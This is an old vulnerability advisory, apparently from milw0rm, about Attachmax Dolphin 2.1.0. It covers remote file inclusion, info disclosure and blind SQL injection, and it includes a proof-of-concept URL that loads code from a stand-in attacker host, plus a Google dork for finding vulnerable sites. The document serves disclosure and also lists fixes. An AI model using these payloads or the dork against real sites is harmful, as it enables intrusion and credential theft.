@@ -1,0 +1,121 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_101$2008
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_101$2008] Attachmax Dolphin <= 2.1.0 Multiple Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author       : K-159
+Date         : September, 16 th 2008
+Location     : Jakarta, Indonesia
+Web          : http://e-rdc.org/v1/news.php?readmore=108
+Critical Lvl : High
+Impact       : System access
+Where        : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : Attachmax Dolphin
+version     : <= 2.1.0
+Vendor      : http://www.attachmax.com/
+Description :
+
+Attachmax allows you to run your very own youtube Video Community site, just like popular Videos sites
+such as youtube, dailymotion and revver. Additionally Attachmax includes the ability for Images and Files,
+following the trend of other popular File Sharing communities such as Imageshack and Rapidshare. 
+So not only do you get a fully functional Video Script, but a complete File Sharing Website.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+1. Remote File Inclusion Vulnerability
+
+Input passed to the "rel_path" parameter in config.php page is not properly verified before being used 
+to include files.This can be exploited to include arbitrary files from local or external resources.
+Successful exploitation requires that "register_globals" is enabled.
+
+
+Poc/Exploit:
+~~~~~~~~~
+http://www.example.com/[path]/config.php?rel_path=http://www.attacker.com/evil?
+
+
+2. File info disclosure Vulnerability
+
+File info.php in main folder not protected to see directly from browser and could allow an attacker 
+to obtain sensitive information from the server.
+
+Poc:
+~~~
+http://www.example.com/[path]/info.php
+
+
+3. Blind SQL Injection Vulnerability.
+
+Input passed to the "category" parameter in search.php page is not properly verified before being used 
+in an sql query.
+This can be exploited thru the browser to manipulate SQL queries and pull the username and password
+from users in plain text.
+
+Poc/Exploit:
+~~~~~~~~~~~
+http://www.example.com/[path]/index.php?page=Search&category=[BlindSQL]
+
+
+
+Dork:
+~~~~
+Google : "2007 Attachmax" or inurl:"controller.php?page=profile"
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn off register_globals in php.ini
+- Rename info.php.
+
+Timeline:
+~~~~~~~~
+
+- 24 - 08 - 2008 bug found
+- 02 - 09 - 2008 vendor contacted
+- 16 - 09 - 2008 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ "Happy 5th Anniversary" for ECHO.
+~ ping - my dearest wife, zautha - my beloved son, and my beloved next children.
+~ "Happy Wedding" for (y3dips,the_day,Negatif),moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az001,
+the_hydra,neng chika, str0ke
+~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOCIATES
+~ SK,pokleyzz,Abond,an0maly,cybertank, super_temon, b120t0,inggar,fachri,adi,rahmat,indra
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,cyb3rh3b
+~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,cR4SH3R,
+kuntua, stev_manado,nofry,k1tk4t,0pt1c
+~ newbie_hacker@yahoogroups.com
+~ macaholic.info, unitiga.com, mac.web.id
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+K-159 || echo|staff || adv[at]e-rdc[dot]org
+Homepage: http://www.e-rdc.org/
+
+-------------------------------- [ EOF ] ---------------------------------- 
+
+# milw0rm.com [2008-09-16]
